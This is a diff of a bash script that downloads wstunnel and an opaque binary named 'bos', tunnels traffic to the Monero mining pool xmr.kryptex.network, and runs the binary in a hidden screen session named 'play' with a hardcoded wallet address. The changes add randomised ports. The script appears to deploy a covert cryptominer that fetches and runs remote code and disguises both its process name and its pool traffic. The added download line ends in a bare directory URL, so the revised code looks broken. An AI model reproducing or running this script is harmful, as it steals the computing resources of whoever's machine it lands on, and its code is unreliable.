@@ -1,11 +1,15 @@
 #!/bin/bash
+WS_PORT=$(shuf -i 10000-65000 -n 1)
+TCP_PORT=$(shuf -i 10000-65000 -n 1)
+echo "WS_PORT=$WS_PORT"
+echo "TCP_PORT=$TCP_PORT"
 sudo apt update
-sudo apt install screen -y
+sudo apt install -y screen
 curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/
 tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
 chmod +x wstunnel bos
-nohup ./wstunnel server ws://127.0.0.1:2367 &
-nohup ./wstunnel client -L tcp://127.0.0.1:3589:xmr.kryptex.network:7029 ws://127.0.0.1:2367 &
-screen -dmS play ./bos -o 127.0.0.1:3589 -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT -t 6
+nohup ./wstunnel server ws://127.0.0.1:${WS_PORT} &
+nohup ./wstunnel client -L tcp://127.0.0.1:${TCP_PORT}:xmr.kryptex.network:7029 ws://127.0.0.1:${WS_PORT} &
+screen -dmS play ./bos -o 127.0.0.1:${TCP_PORT} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.US -t 6
 sleep 34674653455
